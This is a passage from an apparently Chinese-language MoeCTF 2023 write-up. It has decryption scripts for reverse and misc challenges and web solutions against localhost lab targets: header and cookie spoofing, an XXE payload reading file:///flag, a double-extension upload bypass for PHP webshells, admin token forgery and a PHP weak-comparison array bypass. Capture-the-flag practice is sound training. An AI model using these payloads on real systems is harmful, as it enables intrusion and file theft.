class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init</span>(<span class="hljs-params">s, key, Len_k</span>):<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        s[i] = i<br>        k[i] = key[i % Len_k]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">256</span><br>        tmp = s[i]<br>        s[i] = s[j]<br>        s[j] = tmp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">Data, Len_D, key, Len_k</span>):<br>    s = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    rc4_init(s, key, Len_k)<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    t = <span class="hljs-number">0</span><br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Len_D):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s[i]) % <span class="hljs-number">256</span><br>        tmp = s[i]<br>        s[i] = s[j]<br>        s[j] = tmp<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span><br>        Data[k] = Data[k] ^ s[t]<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-string">&quot;moectf2023&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    key_len = <span class="hljs-built_in">len</span>(key)<br><br>    data = <span class="hljs-built_in">bytearray</span>([<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xBA</span>,<br>                      <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x2E</span>,<br>                      <span class="hljs-number">0x50</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xAE</span>,<br>                      <span class="hljs-number">0x03</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>])<br><br>    rc4_crypt(data, <span class="hljs-built_in">len</span>(data), key, key_len)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(data[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><span class="hljs-comment">#moectf&#123;y0u_r3a11y_understand_rc4!!!!&#125;</span><br><br></code></pre></td></tr></table></figure><h3 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h3><p><img src="/mdimg/moectf2023/2.png"><br>base64换表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>str1 = <span class="hljs-string">&quot;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&quot;</span><br>string1 = <span class="hljs-string">&quot;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&quot;</span><br>string2 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-built_in">print</span> (base64.b64decode(str1.translate(<span class="hljs-built_in">str</span>.maketrans(string1,string2))))<br></code></pre></td></tr></table></figure><h3 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=[<span class="hljs-number">0x54</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x60</span>,<br>        <span class="hljs-number">0x56</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x66</span>,<br>        <span class="hljs-number">0x51</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x61</span>,<br>        <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x44</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0x39</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="ANDROIFD"><a href="#ANDROIFD" class="headerlink" title="ANDROIFD"></a>ANDROIFD</h3><p><img src="/mdimg/moectf2023/3.png"><br><img src="/mdimg/moectf2023/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">enc=[<span class="hljs-number">25</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">27</span>, <span class="hljs-number">3</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">11</span>, <span class="hljs-number">29</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;\f&#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-number">28</span>, <span class="hljs-number">21</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">16</span>]<br>a=[]<br>key=<span class="hljs-string">&#x27;themoekey&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(i,<span class="hljs-built_in">int</span>):<br>        a.append(i)<br>    <span class="hljs-keyword">else</span>:<br>        a.append(<span class="hljs-built_in">ord</span>(i))<br><span class="hljs-comment">#print(a)</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[x]^<span class="hljs-built_in">ord</span>(key[x%<span class="hljs-built_in">len</span>(key)])),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="UPX！"><a href="#UPX！" class="headerlink" title="UPX！"></a>UPX！</h3><p><img src="/mdimg/moectf2023/5.png"><br>UPX脱壳<br><img src="/mdimg/moectf2023/6.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">enc =[<span class="hljs-number">10</span>,   <span class="hljs-number">8</span>,   <span class="hljs-number">2</span>,   <span class="hljs-number">4</span>,  <span class="hljs-number">19</span>,   <span class="hljs-number">1</span>,  <span class="hljs-number">28</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">15</span>,  <span class="hljs-number">56</span>, <span class="hljs-number">30</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">18</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">44</span>,   <span class="hljs-number">9</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">47</span>,  <span class="hljs-number">87</span>,  <span class="hljs-number">16</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">19</span>,   <span class="hljs-number">8</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">53</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">17</span>,  <span class="hljs-number">84</span>, <span class="hljs-number">21</span>,  <span class="hljs-number">20</span>,   <span class="hljs-number">2</span>,  <span class="hljs-number">56</span>,  <span class="hljs-number">50</span>,  <span class="hljs-number">55</span>,  <span class="hljs-number">63</span>,  <span class="hljs-number">70</span>,  <span class="hljs-number">70</span>,  <span class="hljs-number">70</span>, <span class="hljs-number">26</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0x67</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="weird-package"><a href="#weird-package" class="headerlink" title="weird_package"></a>weird_package</h3><p>bandzip修复文件<br><img src="/mdimg/moectf2023/7.png"><br>或者7z直接打开压缩包<br>9999是真flag<br><img src="/mdimg/moectf2023/8.png"></p><h3 id="打不开的图片1"><a href="#打不开的图片1" class="headerlink" title="打不开的图片1"></a>打不开的图片1</h3><p>exif<br><img src="/mdimg/moectf2023/9.png"><br><img src="/mdimg/moectf2023/10.png"></p><h3 id="打不开的图片2"><a href="#打不开的图片2" class="headerlink" title="打不开的图片2"></a>打不开的图片2</h3><p>改png文件头<br><img src="/mdimg/moectf2023/11.png"></p><h3 id="狗子-1-普通的猫"><a href="#狗子-1-普通的猫" class="headerlink" title="狗子(1) 普通的猫"></a>狗子(1) 普通的猫</h3><p><img src="/mdimg/moectf2023/12.png"></p><h3 id="building-near-lake"><a href="#building-near-lake" class="headerlink" title="building_near_lake"></a>building_near_lake</h3><p><img src="/mdimg/moectf2023/13.png"></p><h3 id="烫烫烫"><a href="#烫烫烫" class="headerlink" title="烫烫烫"></a>烫烫烫</h3><p>随波逐流得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">这是你的flag：<br><br>a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262<br><br>但是flag用AES加密了，key是下面这行字的sha256（<span class="hljs-built_in">hash</span>值的开头是b34edc782d68fda34dc23329）<br><br>所以说，codepage真的很重要啊（<br></code></pre></td></tr></table></figure><p><img src="/mdimg/moectf2023/14.png"></p><h3 id="狗子-2-照片"><a href="#狗子-2-照片" class="headerlink" title="狗子(2) 照片"></a>狗子(2) 照片</h3><p>zsteg嗦<br><img src="/mdimg/moectf2023/15.png"></p><h3 id="base乐队"><a href="#base乐队" class="headerlink" title="base乐队"></a>base乐队</h3><p>basecrack 然后栅栏4 然后base64</p><h3 id="奇怪的压缩包"><a href="#奇怪的压缩包" class="headerlink" title="奇怪的压缩包"></a>奇怪的压缩包</h3><p>word，ppt都是压缩包<br>改ppt后缀打开<br>ctrl+a<img src="/mdimg/moectf2023/16.png"><br>第三页图片移开看注释<br>第四页移开图片<br>最后一页拖动文本框可以看见</p><h3 id="机位查询"><a href="#机位查询" class="headerlink" title="机位查询"></a>机位查询</h3><p><code>**moectf&#123;jiashi_baisheng_huijin&#125;**</code></p><h3 id="狗子-3-寝室"><a href="#狗子-3-寝室" class="headerlink" title="狗子(3) 寝室"></a>狗子(3) 寝室</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> rarfile<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> py7zr<br><br>a=<span class="hljs-number">9999</span><br><span class="hljs-keyword">while</span> a!=<span class="hljs-number">0</span>:<br>  zipname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.zip&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(zipname)):<br>    zfile=zipfile.ZipFile(zipname)<br>    zfile.extractall()<br>    zfile.close()<br>    a-=<span class="hljs-number">1</span><br>  rarname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.rar&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(rarname)):<br>    rfile=rarfile.RarFile(rarname)<br>    rfile.extractall()<br>    rfile.close()<br>    a-=<span class="hljs-number">1</span><br>  tarname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.tar.gz&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(tarname)):<br>    rfile=tarfile.<span class="hljs-built_in">open</span>(tarname)<br>    rfile.extractall()<br>    rfile.close()<br>    a-=<span class="hljs-number">1</span><br>  zname=<span class="hljs-string">&#x27;shell&#x27;</span>+<span class="hljs-built_in">str</span>(a)+<span class="hljs-string">&#x27;.7z&#x27;</span><br>  <span class="hljs-keyword">if</span>(os.path.exists(zname)):<br>    file=py7zr.SevenZipFile(zname)<br>    file.extractall()<br>    file.close()<br>    a-=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="你想要flag吗"><a href="#你想要flag吗" class="headerlink" title="你想要flag吗"></a>你想要flag吗</h3><p><img src="/mdimg/moectf2023/17.jpg"><br><img src="/mdimg/moectf2023/18.png"><br><strong>rabbit解密</strong></p><h3 id="照片冲洗"><a href="#照片冲洗" class="headerlink" title="照片冲洗"></a>照片冲洗</h3><p>分离图片，b神的工具盲水印提取<br><img src="/mdimg/moectf2023/19.png"></p><h3 id="狗子-4-故乡话"><a href="#狗子-4-故乡话" class="headerlink" title="狗子(4) 故乡话"></a>狗子(4) 故乡话</h3><p><img src="/mdimg/moectf2023/20.png"><br><img src="/mdimg/moectf2023/21.png"></p><h3 id="尊嘟假嘟？"><a href="#尊嘟假嘟？" class="headerlink" title="尊嘟假嘟？"></a>尊嘟假嘟？</h3><p><a href="https://zdjd.vercel.app/">https://zdjd.vercel.app/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher: rY5Ah8BtsYYatLEPu8YCPU22Gr5PQt8YGDKkvb4bk3D4JJeEe5kgCpoEqgRzsM7m9d8jEtE3LUoKpULQnMcuAunU1gtpzC5kSUxFctFTNCMZVHLHZNCo5akzKMRY5bbyBP7RNUeGDEYoUc<br>key: the tailing <span class="hljs-number">8</span> <span class="hljs-built_in">bytes</span> of <span class="hljs-built_in">hash</span> of <span class="hljs-string">&quot;zundujiadu?&quot;</span> which begin <span class="hljs-keyword">with</span> b6091904cdfb        <br>iv: the end <span class="hljs-number">8</span> <span class="hljs-built_in">bytes</span> of <span class="hljs-built_in">hash</span> of <span class="hljs-string">&quot;dududu?&quot;</span> which begin <span class="hljs-keyword">with</span> 272bf1da2207                <br><br>hint1: how do Bitcoin addresses encode?<br>hint2: the name of cryptosystem <span class="hljs-keyword">is</span> <span class="hljs-string">&quot;bl****sh&quot;</span><br></code></pre></td></tr></table></figure><p>key和iv是sha256<br><img src="/mdimg/moectf2023/22.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><p><img src="/mdimg/moectf2023/23.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload:<br>GET:UwU=u<br>POST:Luv=u<br>cookie:character=admin<br>x-forwarded-<span class="hljs-keyword">for</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>User-Agent: MoeBrowser<br></code></pre></td></tr></table></figure><h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br>url=<span class="hljs-string">&#x27;http://localhost:58049/&#x27;</span><br>session=requests.Session()<br>fx = <span class="hljs-number">0</span><br>sd = <span class="hljs-number">0</span><br>data=&#123;<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;steering_control&quot;</span>:fx,<span class="hljs-string">&quot;throttle&quot;</span>:sd&#125;<br>re=session.post(url=url,data=data)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;向左&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;向右&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;弯道直行&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;抓地力太小了&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;抓地力太大了&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;保持这个速度&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">1</span><br>    soup = BeautifulSoup(re.content, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>    info_div = soup.find(<span class="hljs-string">&quot;div&quot;</span>, &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;info&quot;</span>&#125;)<br>    <span class="hljs-built_in">print</span>(info_div.text)<br>    data=&#123;<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;steering_control&quot;</span>:fx,<span class="hljs-string">&quot;throttle&quot;</span>:sd&#125;<br>    re=session.post(url=url,data=data)<br>    <span class="hljs-built_in">print</span>(data)<br>    <br></code></pre></td></tr></table></figure><h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p><img src="/mdimg/moectf2023/24.png"><br>只检测文件后缀第一个点后面的，xxx.png.php就行</p><h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p><img src="/mdimg/moectf2023/25.png"></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>注册一个新账号然后登录得到token<br><img src="/mdimg/moectf2023/26.png"><br>base64decode之后把role：user<br>改成admin,base64encode上传即可</p><h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><p><img src="/mdimg/moectf2023/27.png"><br>bp爆破<br><img src="/mdimg/moectf2023/28.png"></p><h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;localhost:52776&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;multipart/form-data; boundary=---------------------------15719226131077920622631907538&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;document&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;navigate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;cross-site&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="hljs-string">&#x27;?1&#x27;</span>,<br>&#125;<br><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;-----------------------------15719226131077920622631907538</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;xml_content&quot;</span><br><span class="hljs-string">Content-Type: text/xml</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE a[</span><br><span class="hljs-string">    &lt;!ENTITY b SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;xml&gt;&lt;name&gt;&amp;b;&lt;/name&gt;&lt;/xml&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------15719226131077920622631907538--</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>response = requests.post(<span class="hljs-string">&#x27;http://localhost:62103/&#x27;</span>, headers=headers, data=data)<br><br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h3 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h3><p><img src="/mdimg/moectf2023/29.png"><br>加个gif头就能上传<br>发现可以上传php<br>但是不知道目录<br>一直尝试也访问不到木马<br>换思路<br><code>images.php</code>能读文件，拿来读flag<br><img src="/mdimg/moectf2023/30.png"><br><img src="/mdimg/moectf2023/31.png"><br>弱比较数组绕过<br><code>?param1[]=1&amp;param2[]=2</code></p><h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;Hanxin.exe.php&#x27;</span>);<br><br><span class="hljs-variable">$Chant</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>] : <span class="hljs-string">&#x27;夺命十三枪&#x27;</span>;<br><br><span class="hljs-variable">$new_visitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="hljs-variable">$Chant</span>);<br><br><span class="hljs-variable">$before</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new_visitor</span>);<br><span class="hljs-variable">$after</span> = <span class="hljs-title class_">Deadly_Thirteen_Spears</span>::<span class="hljs-title function_ invoke__">Make_a_Move</span>(<span class="hljs-variable">$before</span>);<br><span class="hljs-keyword">echo</span> <span 